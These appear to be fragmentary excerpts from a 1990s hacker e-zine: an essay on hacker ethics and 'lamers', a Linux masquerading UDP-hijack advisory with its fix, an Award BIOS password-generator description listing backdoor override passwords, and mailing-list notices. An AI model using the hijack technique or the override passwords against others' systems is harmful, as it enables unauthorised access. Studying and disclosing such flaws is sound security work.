            in a hack, if you don't know how it works. That is the whole idea of 
            hacking, to find out how systems work. 

       These are clear examples of what the real intent of a hacker is when he 
       breaks a system. It's very close to the idea of a child that opens a toy 
       to see how it works. The difference is that the hacker tries not to 
       destroy the toy (aside from the fact that the toy is not his own...). 

       Anyway, let's see the specific definition of the "cracker", according to 
       the Jargon File: 

            :cracker: n. One who breaks security on a system. Coined ca. 1985 by 
            hackers in defense against journalistic misuse of {hacker} (q.v., 
            sense 8). An earlier attempt to establish `worm' in this sense 
            around 1981--82 on USENET was largely a failure. 

            Both these neologisms reflected a strong revulsion against the theft 
            and vandalism perpetrated by cracking rings. While it is expected 
            that any real hacker will have done some playful cracking and knows 
            many of the basic techniques, anyone past {larval stage} is expected 
            to have outgrown the desire to do so. 

            Thus, there is far less overlap between hackerdom and crackerdom 
            than the {mundane} [the term "mundane" is taken from the Sci-Fi 
            fandom and identifies everything outside the world of the computer 
            science, or the hacking] reader misled by sensationalistic 
            journalism might expect. Crackers tend to gather in small, 
            tight-knit, very secretive groups that have little overlap with the 
            huge, open poly-culture this lexicon describes; though crackers 
            often like to describe *themselves* as hackers, most true hackers 
            consider them a separate and lower form of life. 

            Ethical considerations aside, hackers figure that anyone who can't 
            imagine a more interesting way to play with their computers than 
            breaking into someone else's has to be pretty {losing} [on the other 
            hand, they have the same consideration for the people who use the 
            computer in an absolute conventional way, such as only to write 
            documents or to play] [...] 

       Furthermore, about the "cracking" itself, the Jargon File says: 

            :cracking: n. The act of breaking into a computer system; what a 
            {cracker} does. Contrary to widespread myth, this does not usually 
            involve some mysterious leap of hackerly brilliance, but rather 
            persistence and the dogged repetition of a handful of fairly 
            well-known tricks that exploit common weaknesses in the security of 
            target systems. Accordingly, most crackers are only mediocre 
            hackers. 

       However, This is a superficial and reductive vision. In fact, as it is 
       easily imaginable, there exist people, that are as experienced with 
       computers and as thirsty of knowledge, that however don't have any 
       respect of the hacker ethic and don't hesitate to perform actions meant 
       to damage computer systems or other people. They are the so-called 
       Dark-side hackers. This term derives from George Lucas' "Star Wars". A 
       Dark-side hacker, just like Darth Vader, is "seduced by the dark side of 
       the Force". It has nothing to do with the common idea of "good" and 
       "bad", but it's closer to the idea of "legal" and "chaotic" in 
       Dungeons&Dragons: In substance, the dark-side hackers are accorded the 
       same dignity and recognized as having the ability of a hacker, but their 
       orientation makes them a dangerous element for the community. A more 
       common definition, reserved for those that damage someone else's computer 
       systems without drawing any benefit from it, (therefore for pure 
       stupidity or evilness), it is that of Malicious hackers. 

       More recent versions of the Jargon File (in which some most obsolete 
       terms have been removed), as the version 4.0.0, 24 JUL 1996, makes clear, 
       not only the distinction between hacker and cracker, but also between the 
       entire hack scenes and other parallel realities, like piracy, and the 
       "warez d00dz", who collect an impressive amount of software (games and 
       applications, or better said "gamez" and "appz"), that they are never 
       likely to use, and whose greatest pride is to get software, break its 
       protections, and distribute it on their website before their rival crew, 
       where possible, within the same day it was released ("0-day warez"). 

       One could think that the Jargon File speaks only in theory, and that it 
       describes the hacker ethic in a fantastic and utopian way. This is not 
       so, hackers really are attached to their principles. The following is a 
       practical example concerning one of the most famous hacker crews, the LOD 
       (Legions Of Doom, that takes its name from the group of baddies in the 
       series of cartoons of Superman and his Superfriends), of which The Mentor 
       was also a member during the years 1988-89 (the already cited author of 
       "The conscience of a Hacker"). 

       In "The History of LOD/H", Revision #3 May 1990, written by Lex Luthor 
       (founder of the crew, from the name of the baddie in the movie Superman 
       I), and published on their e-zine "The LOD/H Technical Journal", Issue 
       #4, released on May 20, 1990 (File 06 of 10), we can read: 

            Of all 38 members, only one was forcefully ejected. It was found out 
            that Terminal Man [member dof the LOD/H in 1985] destroyed data that 
            was not related to covering his tracks. This has always been 
            unacceptable to us, regardless of what the media and law enforcement 
            tries to get you to think. 

       Yet, not all agree upon the same principles, and there are some "grey 
       areas": for example, taking possession of objects that allow you to 
       access information, or pursuing a personal purpose, can be considered 
       "ethical" by some. A specific example could be "grabbing": the theft of 
       things like keys, magnetic cards, manuals or technical schemes, anyway 
       this is a debatable activity, since a hacker prefers to copy rather to 
       subtract, not only to not damage the "victim", but also to avoid leaving 
       traces of his intrusion. A more acceptable and legal variant is 
       "trashing", that consists in looking inside the garbage of the subject, 
       searching for objects and/or useful information. 

       But breaking into computer systems is only a small activity amongst the 
       many things that hackers are involved in, and the aversion against the 
       virtual vandal actions are a small part of the hacker ethic. The hacker 
       ethic is something greater, almost mystic, and draws its origins from the 
       first hackers, those that programmed the TX-0, using the first available 
       computers in the big American universities like MIT or Stanford. From the 
       already cited "Hackers, Heroes of the Computer Revolution" by Steven 
       Levy: 

            Something new was coalescing around the TX-0: a new way of life, 
            with a philosophy, an ethic, and a dream. 

            There was no one moment when it started to dawn on the TX-0 hackers 
            that by devoting their technical abilities to computing with a 
            devotion rarely seen outside of monasteries they were the vanguard 
            of a daring symbiosis between man and machine. With a fervor like 
            that of young hot-rodders fixated on souping up engines, they came 
            to take their almost unique surroundings for granted, Even as the 
            elements of a culture were forming, as legends began to accrue, as 
            their mastery of programming started to surpass any previous 
            recorded levels of skill, the dozen or so hackers were reluctant to 
            acknowledge that their tiny society, on intimate terms with the 
            TX-0, had been slowly and implicitly piecing together a body of 
            concepts, beliefs, and mores. 

            The precepts of this revolutionary Hacker Ethic were not so much 
            debated and discussed as silently agreed upon. No manifestos were 
            issued ["The Mentor"'s one, very polemic, was written only about 
            twenty years later]. No missionaries tried to gather converts. The 
            computer did the converting [...] 

       Shortly, Steven Levy sums up the "hacker ethic" this way: 

            Access to computers -- and anything which might teach you something 
            about the way the world works -- should be unlimited and total. 
            Always yield to the Hands-On imperative. 

            All information should be free. 

            Mistrust Authority. Promote Decentralization. 

            Hackers should be judged by their hacking, not bogus criteria such 
            as degrees, age, race, or position. 

            You can create art and beauty on a computer. 

            Computers can change your life for the better. 

            LIKE ALADDIN'S LAMP, YOU COULD GET IT [THE COMPUTER] TO DO YOUR 
            BIDDING. 


       THE LAMER 

       From "The Hacker Crackdown - Law and Disorder on the Electronic Frontier" 
       by Bruce Sterling, Bantam Books, 1992. (ISBN 0-553-08058-X, paperback: 
       ISBN 0-553-56370-X, released as free electronic text for non-commercial 
       purposes) 

            There are hackers today who fiercely and publicly resist any 
            besmirching of the noble title of hacker. Naturally and 
            understandably, they deeply resent the attack on their values 
            implicit in using the word "hacker" as a synonym for 
            computer-criminal. 

            [...] 

            The term "hacking" is used routinely today by almost all law 
            enforcement officials with any professional interest in computer 
            fraud and abuse. American police describe almost any crime committed 
            with, by, through, or against a computer as hacking. 

       If the differentiation between hacker, cracker and dark-side hacker can 
       result a very tiny distinction for the ones who live outside of the 
       computer scene, nobody, especially a journalist, should confuse a hacker 
       with the poor idiot that was locked up for using, with no thought to the 
       consequences, programs that he found somewhere. (even if using the term 
       "hacker" does sell more newspapers... The difference between hackers and 
       journalists is that the aforementioned have ethics, the latter, not even 
       a sense of modesty... but this is often simply mere ignorance). 

       Let's take as an example the following article published on the Italian 
       newspaper "L'Unione Sarda" (http://www.unionesarda.it/), by Luigi 
       Almiento (almiento@unionesarda.it). 

       POLICE. 

       The arrested hacker is a surveyor, aged 25 

       Files were stolen from the computers of internet "navigators", with the 
       aid of a virus spread on the Internet

       Many people from different national service providers, recently learned to
       their own detriment, that it is better not to stay and chat to strangers on
       the chat-lines of the Internet. This occured when a hacker aged 25, obtained
       the user names and passwords of their dial up accounts, while they were
       on-line. 

       [...] 

       "Harris", explains the lieutenant Saverio Spoto, commander of the Police 
       Station [actually they are "Carabinieri", not the normal Police, because in
       Italy there are two different polices, don't ask why],  contacted his victims
       through Icq, a "talking place", offered by many Internet providers. During 
       these "written talks", using an access key he acquired that gives false 
       information, G. F. sent the Netbus virus to the computers of his victims. 
       This allowed him to "navigate" the hard drives of the computers of these 
       people while they were connected to the internet. Harris also had a site,
       which offered pornographic pictures, pirate-programs and files of every 
       kind, and whenever someone connected to his address, they were immediately
       infected by the computer virus. 
       
       [...] 

       In a few words, lieutenant Spoto succeeds in showing his complete 
       ignorance of the subject: he gives an abominable definition of ICQ, 
       defines Netbus as a virus rather than a trojan (which means he doesn't 
       have any idea of how it works), and still not being satisfied with this, 
       attributes it with a contagiousness similar to the Ebola virus: to be 
       infected simply by connecting to an Internet address sounds like 
       something supernatural. Then, he shamelessy concludes with the invitation 
       "If anyone has had contact with Harris, and thinks that their files may 
       have been forced, they can come to us at the Police Station". If everyone 
       at the Police Station are as experienced as he is, it would be preferable 
       to keep the Harris' "virus" rather than allowing them to put their hands 
       anywhere near your computer. 

       Besides, these self-acclaimed hackers are almost never bust because of a 
       police operation, (unless they caused a lot of trouble), but because they 
       have the stupid habit of boasting of their actions in chatrooms or even 
       in real life. Often in front of total strangers, that are often police 
       officers or people close to the law enforcement environment, (such as the 
       child or the girlfriend of a police officer). In fact, the conclusive 
       part of the article regarding "Harris" says: "The investigators did not 
       explain how, but only that they had succeeded in identifying the 
       surveyor": obviously the law officers would like people to think that 
       they identified the guilty person by means of some complicated technique, 
       pursuing the information packets or something in this line, rather than 
       admitting that they only had to make a few enquiries on IRC channels. 

       The hacker is the one that develops the exploit, and eventually creates a 
       program based on this expoit. People that blindly use these programs 
       because they found them on the Internet, or even worse, because a friend 
       passed them on to them, are merely lamers, that only have a vague idea of 
       how to use the tool they have in their hands and they know nothing about 
       computer systems, programming, or how to cover their tracks. Often these 
       self-acclaimed hackers, self infect themselves with a virus or a trojan 
       they just downloaded, due to their incapabilities. Putting these programs 
       in the hands of the average person is like giving a loaded gun to a five 
       year-old. 

       The fact is, that up to the early '80s, computers were only intended for 
       hackers, specialized personnel or students. Only later did they appear on 
       the desks of offices and in houses. The first home computers replaced the 
       primitive consoles of videogames like the Atari 2600, the Intellivision 
       and the Colecovision (the revolution was lead by the Commodore 64 and the 
       Sinclair ZX Spectrum), but still across the whole world there was a 
       "computer culture" throughout the '80s, there were published magazines 
       that taught programming (mainly BASIC, as well as Machine Code) and very 
       advanced techniques worthy of the best hackers. Then during the '90s, 
       Apple and Microsoft's dream started to come true, "a computer on every 
       desk and in every home". The computer became a common appliance available 
       to almost everybody, the general level of the magazines started to drop, 
       and almost all were confined to publishing articles about the latest 
       hardware and software, or advice on how to use commercial applications. 
       This change in the computer world that made computers not only the sole 
       domain of the hackers, but for everyone, has certainly had some positive 
       general effects, but it proved to be a double edged sword, especially 
       with the advent of the Internet. These days anyone can have powerful 
       tools that inflict damage on other people, real "digital weapons", 
       without having a clue about how they work or how they should be 
       "handled". The average guy can get locked up just for perpetrating what 
       he thought was a "cool" joke, even if it was in bad taste. 

       All those lamers-wannabe-hackers should better satisfy their needs with 
       APEX v1.00 r10/8/91, a nice program written by Ed T. Toton III (however 
       the original idea is older) that simulates the connection to different US 
       government and military computers (like those of NORAD, or of NASA), 
       among other things it is also possible to pretend that you are the 
       President of the United States of America, and enter the system that 
       controls the nuclear weapons. With a bit of ability and practice, it is 
       possible to convince some friends that you are really trying to force the 
       US computer systems, and pass the time having good clean fun, without 
       hurting anybody, risking a jail sentence and/or offending the hackers by 
       trying to pretend to be what you are not. 

       But besides this, outside of the "criminal" context, something that 
       bothers hackers is the ever increasing mass of self-claimed computer 
       "experts", that actually don't know much more than how to turn on a 
       computer and launch a program, and they fill their mouthes with loads of 
       technical words about which they know nothing. At this point, it is very 
       interesting to read this text from the already quoted home page of the 
       KIN: 

            I remember [...] When writing software was closer to art and magic 
            than to business and/or just coding. I miss that now. What happened 
            after that? Well, tons of fast graduates appeared who could only do 
            Basic or Clipper/DBase programming, who pretended to be the best. 
            They could wear suites and had money and relatives... I called them 
            nephews. How many times were you in the situation when you gave the 
            best offer, and you simply feel you HAD to write this software - but 
            in the end your client says something like: "I'm really sorry, but I 
            just got a call from my wife and her nephew works for this company 
            in Nebraska who are certified Basic engineers so we'll have to give 
            the contract to them?" The nephews produced terrible software which 
            led to terrible disappointments in the industry ('I've invested so 
            much money in computers and it's not really working for me'). 

            [...] The Net gives you a chance to be first creative and then think 
            about business. Let's use it now - before nephews will get their 
            certified degrees.... 

       Sadly, a crowd of nephews are already working, with or without certified 
       degrees, and armed with programs like Front Page or Publisher creating 
       websites, filling their big mouths with words like FTP and client-server 
       application, even if they don't know what they mean or what they are

      PROBLEM
  
      H  D  Moore  found  following.    Due  to  lax  checking  in   the
      masquerading kernel code, an attacker  is able to rewrite a  linux
      masq gateway's UDP  masquerading entries so  that the remote  host
      and port are whatever they choose.  This creates a tunnel  between
      whatever host  and port  they want  and a  UDP port  on an  inside
      machine.  The attacker is  unable to tell what local  inside ports
      and addresses are  being used, but  they can determine  the number
      of currently masqueraded connections  and the number of  different
      hosts using those  connections behind the  firewall.  Any  network
      where UDP traffic is masqueraded  to the outside is vulnerable  to
      this,  including  DNS,  TFTP,  NetBIOS,  and  a multitude of other
      applications  which  rely  on  UDP  transport.   Since  UDP  is  a
      connectionless  protocol,  the  only  way  to  determine  that   a
      masqueraded connection  is no  longer being  used is  by timing it
      out due to lack of activity or receiving ICMP messages  indication
      the  port  is  closed.   The  result  is  that there is a 5 minute
      time-out by default for all masqueraded UDP sessions, allowing  an
      attacker enough time to find and exploit the connection with  some
      of the methods outlined in the Examples section below.
  
      For  those  familiar  with  the  linux masquerading system, please
      jump to the next paragraph.  IP masquerading is an  implementation
      of NAT (Network Address Translation) for the linux OS.  It  allows
      you to connect an internal  network using private addresses to  an
      external  network  (internet)  in  a  fairly  secure  manner.  All
      packets  coming  from  the  internal  network and destined for the
      external network are rewritten so  the source of those packets  is
      the masquerading  gateway's external  address and  the source port
      is the gateway's source port.  This only requires one external  IP
      address  to  enable  internet  access  for  hundreds/thousands  of
      internal  machines  and  is  therefore  a  popular method for many
      businesses and  home users  with broadband  connections.   The TCP
      and UDP  protocols require  both source  and destination  ports as
      well as  source and  destination addresses  to work.   The  source
      port for outgoing UDP/TCP  connections is usually picked  from the
      first available  port between  1024 and  65535 on  the originating
      host, so how does the masq gateway relay these connections AND  be
      able to use  these protocols for  its own networking?   The kernel
      sets aside the  ports 61000 to  65096 by default  for handling the
      masqueaded connection entries, allowing for a theoretical  maximum
      of 4096 of both UDP and  TCP connections at a time.   These values
      can be changed in the code or through the /proc file system.   Now
      when connection request from internal  host A comes in from  local
      port 1035 and  its destination is  the external DNS  server Host Z
      on  port  53,  the  masquerading  machine  adds a new entry to the
      masquerading table that looks like this:
  
          Host A:1035 (651001) -> Host Z:53
  
      The port  in paranthesis  is the  local port  the gateway  uses to
      send the  forwarded UDP  datagrams from  and the  port it  uses to
      receive responses back from Host Z.  The next paragraph  describes
      how  the  vulnerability  found  allows  an  attacker to modify the
      right side of the above  connection to allow traffic to  come from
      thier host  back into  the internal  network to  the local port on
      the inside host.
  
      The  UDP  masquerading  code  only  checks the DESTINATION PORT to
      determine if a  packet coming from  the external network  is to be
      forwarded inside.  It  then sets the remote  HOST and PORT to  the
      source address and  source port of  the incoming packet.   This is
      due to a number of  hosts/services returning UDP from an  IP other
      than that which the original UDP  packet went to - for example  it
      is frequently the case that NFS servers just use the interface  ip
      address "closest" to that which the NFS op came from.
  
      An attacker only needs to  determine  the  local  port on the masq
      gateway  to  be  able  to  rewrite  the  masq table with thier own
      address  and  port,  which  is  trivial considering the relatively
      small port range set by default for use by masqueraded conenctions
      (65100 -  65096).   Now how  do you  determine which  one of these
      ports is the  local port on  the gateway for  the masq connection?
      Easy, we send a probe packet to each of these hosts and watch  the
      IP ID field  in the responses.   The IP ID  field is  sequentially
      incremented on each host's TCP/IP stack for each packet they  send
      out, so the masq'd port ICMP  response will have the IP ID  of the
      INTERNAL host, which is almost always at least 1000 away from  the
      current IP ID  of the gateway  machine.  See  the Examples section
      below for packet traces of a complete scan/attack.
  
      Examples.   We  know  that  example.com  has  a linux masquerading
      gateway and that thier DNS server is outside of this firewall.  We
      can come to the conclusion that internal machines must be able  to
      contact  the  external  DNS  server  to  be  able  to  access  the
      internet.  We start sending our probe packets:
  
          Host A is our internal workstation (192.168.1.100)
          Host B is our masq gateway (192.168.1.1 / 10.0.0.1)
          Host C is the DNS server (10.0.0.25)
          Host X is the attacker (10.10.187.13)

      We now have  a working tunnel  from our host  to port 1035  on the
      inside machine!
  
      We have demonstrated  that it is  possible for us  to 'hijack' the
      enternal side of a masqueraded connection, so now what?  There  is
      not a  whole lot  we can  do to  the closed  local udp port on the
      inside    machine,    so    its    time    to    examine     other
      applications/protocols  that  use  UDP  for  transport  and   what
      security risks there are in allowing unrestricted external  access
      to thier  source ports.   We leave  this as  an excercise  to  the
      reader...
  
      Following the "NetBIOS Info"  thread on Incidents mailing  list at
      SF, Robert Graham  mentioned a utility  he wrote to  automatically
      respond  to  netbios  port  137  name  probes  with a netbios name
      lookup back to the originating  host.  He mentioned that  it seems
      to  cut  right  through  state-based  firewalls  and  NAT  systems
      because the response probe looks  like a response to the  outgoing
      probe.  Assuming that a host  on an inside network is sending  out
      these netbios name  queries, an attacker  could exploit the  linux
      2.2.x vulnerability and be   able to query the  netbios  names  of
      internal machines.  More info:
  
          http://www.robertgraham.com/pubs/firewall-seen.html#netbios
  
      SOLUTION
  
      In  general  it  is  not  advisable  the  use  of  UDP  masq for a
      firewalling  gateway  -  since  the  only  thing  that  people are
      normally putting through the UDP side is DNS, you are much  better
      advised to  put a  decent caching  name server  on the gateway box
      and block UDP through completely.
  
      The core problem  is precisely not  being able to  actually _know_
      when internal box has closed the  port.  You can easily revert  to
      good"old" way (1 tunnel/pair) by commenting out
  
          #define CONFIG_IP_MASQ_LOOSE_DEFAULT 1
  
      at  ip_masq.c:418  (stupid  patch  attached).   This  should  drop
      hijack'ing...  Of  course, if we  change the default,  some way to
      enable  it  back  perhaps  on  a  per-application  basis  (ip_masq
      module) MUST be done.

       * NAME
       *
       *    awardpw -- Award BIOS Password generator and hash calculator
       *
       * SYNOPSIS
       *
       * awardpw
       * awardpw password1 [password2...]
       * awardpw {-r | -s} [-t target] [-l length] [-i randseed]
       *
       * DESCRIPTION
       *
       *    Without arguments, awardpw prints a usage message.  Given a list
       *    of passwords, it calculates the Award BIOS hash for each
       *    password.  Given option -r, it generates random, alphanumeric
       *    (digits and upper and lower case) passwords of the given length,
       *    matching the target hash.  Given option -s, it generates the
       *    sequence of all printable passwords of given length and target
       *    hash.
       *
       *    The default target is 0x1eaa, a common hash for the Award
       *    "override" password.  The default length is 4.
       *
       * NOTES
       *
       *    The "intended" override password for hash 0x1eaa was probably
       *    "AWARD_SW", though "j262", "Syxz", and others have been
       *    offered.  Someone reported "aLLy" (hash 0x1ea9) working for
       *    later versions of the Award BIOS, where the old passwords didn't
       *    work.  "AWARD_SV" has hash 0x1ea9, too.
       *
       *    On my Award BIOS (f000:fff5 date "03/10/95"), the password
       *    checking code uses the word at f000:ec60 for the override hash.
       *    If you have an OEM version of Award that doesn't respond to the
       *    "usual" overrides, you might want to check that word to see if
       *    a different override hash is sitting there.
       *
       *    Some combinations of arguments will generate plenty of
       *    passwords, some will generate none.  For example, there are no
       *    5-character plaintext passwords for the 0x1eaa hash, but
       *    4-character and 6-character passwords are plentiful.  This is
       *    just an artifact of the hashing algorithm used.

      check out http://www.attrition.org/mirror/attrition/groups.html to see who
      you are up against. You can often gather intel from IRC as many of these
      groups maintain a presence by having a channel with their group name as 
      the channel name, others aren't so obvious but do exist.

      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
      After seeing several questions about traffic directed at ports as 31337 and
      12345 I've put together a list of all trojans known to me and the default
      ports they are using. Of course several of them could use any port, but I

      translated in the near future).
      
      To help anyone to detect trojan attacks, Im planning to add information
      about the original names of the executables, their size, where they usually
      are hiding, and the names of any helpfiles they may use. I will also add
      tools or links to tools that may be of your assistance.
      
      Feel free to get back to me with any comments or suggestions. If you find
      new trojans Ill love to get my hands on them, but please mail me first, as
      I dont need more than one copy. If you have live experiance of trojan
      attacks Im interested to read about your findings.

A.4  The hacker's Ethic (90's Style)
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
     
     
          _   _            _             _    _____ _   _     _
         | | | | __ _  ___| | _____ _ __( )__| ____| |_| |__ (_) ___

     Sadly, due to the traditional ignorance and sensationalizing of the mass
     media, the once-noble term hacker has become a perjorative.
     
     Among true computer people, being called a hacker is a compliment. One of
     the traits of the true hacker is a profoundly antibureaucratic and
     democratic spirit. That spirit is best exemplified by the Hacker's Ethic.
     
     This ethic was best formulated by Steven Levy in his 1984 book Hackers:
     Heroes of the Computer Revolution. Its tenets are as follows:

      1 - Access to computers should be unlimited and total. 
      2 - All information should be free. 
      3 - Mistrust authority - promote decentralization. 
      4 - Hackers should be judged by their hacking not bogus criteria such as
          degrees, age, race, or position. 
      5 - You create art and beauty on a computer, 
      6 - Computers can change your life for the better. 

     The Internet as a whole reflects this ethic.

    BUGTRAQ - Subscription info
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~

    What is Bugtraq?

    Bugtraq is a full-disclosure UNIX security mailing list, (see the info
    file) started by Scott Chasin <chasin@crimelab.com>. To subscribe to
    bugtraq, send mail to listserv@netspace.org containing the message body

    About the Bugtraq mailing list
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    The following comes from Bugtraq's info file:

    This list is for *detailed* discussion of UNIX security holes: what they are,
    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

    + Information on Unix related security holes/backdoors (past and present)
    + Exploit programs, scripts or detailed processes about the above
    + Patches, workarounds, fixes
    + Announcements, advisories or warnings
    + Ideas, future plans or current works dealing with Unix security
    + Information material regarding vendor contacts and procedures
    + Individual experiences in dealing with above vendors or security 
      organizations
    + Incident advisories or informational reporting

    Any non-essential replies should not be directed to the list but to the
    originator of the message. Please do not "CC" the bugtraq reflector 
    address if the response does not meet the above criteria.

    Remember: YOYOW.

    You own your own words. This means that you are responsible for the words
    that you post on this list and that reproduction of those words without 
    your permission in any medium outside the distribution of this list may be
    challenged by you, the author.

    UPDATED Sept/99 - Sent in by Androthi, tnx for the update
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    

      I am pleased to inform you of several changes that will be occurring
      on June 5th. I hope you find them as exciting as I do.
      
      
      BUGTRAQ moves to a new home
      ---------------------------
      
      
      First, BUGTRAQ will be moving from its current home at NETSPACE.ORG
      to SECURITYFOCUS.COM. What is Security Focus you ask? Wait and read
      below. Other than the change of domains nothing of how the list
      is run changes. I am still the moderator. We play by the same rules.
      
      
      Security Focus will be providing mail archives for BUGTRAQ. The
      archives go back longer than Netspace's and are more complete than
      Geek-Girl's.
      
      
      The move will occur one week from today. You will not need to
      resubscribe. All your information, including subscription options
      will be moved transparently.
      
      
      Any of you using mail filters (e.g. procmail) to sort incoming
      mail into mail folders by examining the From address will have to
      update them to include the new address. The new address will be:
      
      
                            BUGTRAQ@SECURITYFOCUS.COM
      
      
      Security Focus also be providing a free searchable vulnerability
      database.
      
      
      BUGTRAQ es muy bueno
      --------------------
      
      
      It has also become apparent that there is a need for forums
      in the spirit of BUGTRAQ where non-English speaking people
      or people that don't feel comfortable speaking English can
      exchange information.
      
      
      As such I've decided to give BUGTRAQ in other languages a try.
      BUGTRAQ will continue to be the place to submit vulnerability
      information, but if you feel more comfortable using some other
      language you can give the other lists a try. All relevant information
      from the other lists which have not already been covered here
      will be translated and forwarded on by the list moderator.
      
      
      In the next couple of weeks we will be introducing BUGTRAQ-JP
      (Japanese) which will be moderated by Nobuo Miwa <n-miwa@lac.co.jp>
      and BUGTRAQ-SP (Spanish) which will be moderated by CORE SDI S.A.
      from Argentina <http://www.core-sdi.com/> (the folks that brought you
      Secure Syslog and the SSH insertion attack).
      
      
      What is Security Focus?
      -----------------------
      
      
      Security Focus is an exercise in creating a community and a security
      resource. We hope to be able to provide a medium where useful and
      successful resources such as BUGTRAQ can occur, while at the same
      time providing a comprehensive source of security information. Aside
      from moving just BUGTRAQ over, the Geek-Girl archives (and the Geek Girl
      herself!) have moved over to Security Focus to help us with building
      this new community. The other staff at Security Focus are largely derived
      from long time supporters of Bugtraq and the community in general. If
      you are interested in viewing the staff pages, please see the 'About'
      section on www.securityfocus.com.
      
      
      On the community creating front you will find a set of forums
      and mailing lists we hope you will find useful. A number of them
      are not scheduled to start for several weeks but starting today
      the following list is available:
      
      
      * Incidents' Mailing List. BUGTRAQ has always been about the
         discussion of new vulnerabilities. As such I normally don't approve
         messages about break-ins, trojans, viruses, etc with the exception
         of wide spread cases (Melissa, ADM worm, etc). The other choice
         people are usually left with is email CERT but this fails to
         communicate this important information to other that may be
         potentially affected.
      
      
         The Incidents mailing list is a lightly moderated mailing list to
         facilitate the quick exchange of security incident information.
         Topical items include such things as information about rootkits
         new trojan horses and viruses, source of attacks and tell-tale
         signs of intrusions.
      
      
         To subscribe email LISTSERV@SECURITYFOCUS.COM with a message body
         of:
      
      
                   SUBS INCIDENTS FirstName, LastName
      
      
      Shortly we'll also be introducing an Information Warfare forum along
      with ten other forums over the next two months. These forums will be
      built and moderated by people in the community as well as vendors who
      are willing to take part in the community building process.
      *Note to the vendors here* We have several security vendors who have
      agreed to run forums where they can participate in the online communities.
      If you would like to take part as well, mail Alfred Huger,
      ahuger@securityfocus.com.
      
      
      On the information resource front you find a large database of
      the following:
      
      
      * Vulnerabilities. We are making accessible a free vulnerability
         database. You can search it by vendor, product and keyword. You
         will find detailed information on the vulnerability and how to fix it,
         as well are links to reference information such as email messages,
         advisories and web pages. You can search by vendor, product and
         keywords. The database itself is the result of culling through 5
         years of BUGTRAQ plus countless other lists and news groups. It's
         a shining example of how thorough full disclosure has made a significant
         impact on the industry over the last half decade.
      
      
      * Products. An incredible number of categorized security products
         from over two hundred different vendors.
      
      
      * Services. A large and focused directory of security services offered by
         vendors.
      
      
      * Books, Papers and Articles. A vast number of categorized security
         related books, papers and articles. Available to download directly
         for our servers when possible.
      
      
      * Tools. A large array of free security tools. Categorized and
         available for download.
      
      
      * News: A vast number of security news articles going all the way
         back to 1995.
      
      
      * Security Resources: A directory to other security resources on
         the net.
      
      
      As well as many other things such as an event calendar.
      
      
      For your convenience the home-page can be personalized to display
      only information you may be interested in. You can filter by
      categories, keywords and operating systems, as well as configure
      how much data to display.
      
      
      I'd like to thank the fine folks at NETSPACE for hosting the
      site for as long as they have. Their services have been invaluable.
      
      
      I hope you find these changes for the best and the new services
      useful. I invite you to visit http://www.securityfocus.com/ and
      check it out for yourself. If you have any comments or suggestions
      please feel free to contact me at this address or at

      It all starts long ago, on a network far away..
      
      
      Not really. Several months ago the system that hosted the ISN mail list
      was taken offline. Before that occured, I was not able to retrieve the
      subscriber list. Because of that, the list has been down for a while. I
      opted to wait to get the list back rather than attempt to make everyone
      resubscribe.
      
      
      As you can see from the headers, ISN is now generously being hosted by
      Security Focus [www.securityfocus.com]. THey are providing the bandwidth,
      machine, and listserv that runs the list now.
      
      
      Hopefully, this message will find all ISN subscribers, help us weed out
      dead addresses, and assure you the list is still here. If you have found
      the list to be valuable in the past, please tell friends and associates
      about the list. To subscribe, mail listserv@securityfocus.com with
      "subscribe isn firstname lastname". To unsubscribe, "unsubscribe isn".
      
      
      As usual, comments and suggestions are welcome. I apologize for the down
      time of the list. Hopefully it won't happen again. ;)

      Welcome to Win2K Security Advice! Thank you for subscribing. If you have any
      questions or comments about the list please feel free to contact the list
      moderator, Steve Manzuik, at steve@win2ksecadvice.net.
      
      To see what you've missed recently on the list, or to research an item

      ==============
      NTSecurity.net brings the security community a brand new (Oct 99) and
      much-requested Windows security mailing list. This new moderated mailing list,
      Win2KSecAdvice (formerly NTSecAdvice,) is geared towards promoting the open
      discussion of Windows-related security issues.
      
      With a firm and unwavering commitment towards timely full disclosure, this
      new resource promises to become a great forum for open discussion
      regarding security-related bugs, vulnerabilities, potential exploits, virus,
      worms, Trojans, and more. Win2KSecAdvice promotes a strong sense of community
      and we openly invite all security minded individuals, be they white hat,
      gray hat, or black hat, to join the new mailing list.
      
      While Win2KSecAdvice was named in the spirit of Microsoft's impending product
      line name change, and meant to reflect the list's security focus both now and
      in the long run, it is by no means limited to security topics centered around
      Windows 2000. Any security issues that pertain to Windows-based networking are
      relevant for discussion, including all Windows operating systems, MS Office,
      MS BackOffice, and all related third party applications and hardware.
      
      The scope of Win2KSecAdvice can be summarized very simply: if it's relevant to
      a security risk, it's relevant to the list.
      
      The list archives are available on the Web at http://www.ntsecurity.net,
      which include a List Charter and FAQ, as well as Web-based searchable list
      archives for your research endeavors.

A.9  Whats in a name? why HWA.hax0r.news??
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                             
      
      Well what does HWA stand for? never mind if you ever find out I may
     have to get those hax0rs from 'Hackers' or the Pretorians after you.

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' <see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you
     up  and comers, i'd highly recommend you get that book. Its almost
     like  buying a clue. Anyway..on with the show .. - Editorial staff

    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
